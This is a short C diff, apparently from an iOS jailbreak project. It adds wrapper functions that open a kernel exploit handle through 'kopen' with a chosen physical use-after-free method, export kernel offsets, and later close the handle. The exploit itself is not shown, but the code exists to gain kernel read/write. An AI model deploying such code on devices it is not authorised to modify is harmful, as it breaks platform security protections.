@@ -27,6 +27,8 @@ uint64_t data__gPhysBase = 0;
 
 uint64_t func__proc_set_ucred = 0;
 
+uint64_t _kfd = 0;
+
 void set_offsets(void) {
     kernel_slide = get_kernel_slide();
     kernel_base = kernel_slide + KERNEL_BASE_ADDRESS;
@@ -70,5 +72,26 @@ int meow(void) {
     if(!isarm64e())
         offsetfinder64_kread();
     
+    return 0;
+}
+
+uint64_t kpoen_bridge(uint64_t puaf_method, uint64_t pplrw) {
+    uint64_t exploit_type = (1 << puaf_method);
+    _kfd = kopen(exploit_type, pplrw);
+    if(isarm64e())
+    {
+        offset_exporter();
+    }
+    
+    if(_kfd != 0)
+        return _kfd;
+    
+    return 0;
+}
+
+uint64_t meow_and_kclose(uint64_t _kfd) {
+    if(!isarm64e() && ((struct kfd*)_kfd)->info.env.vid >= 8)
+        meow();
+    kclose(_kfd);
     return 0;
 }
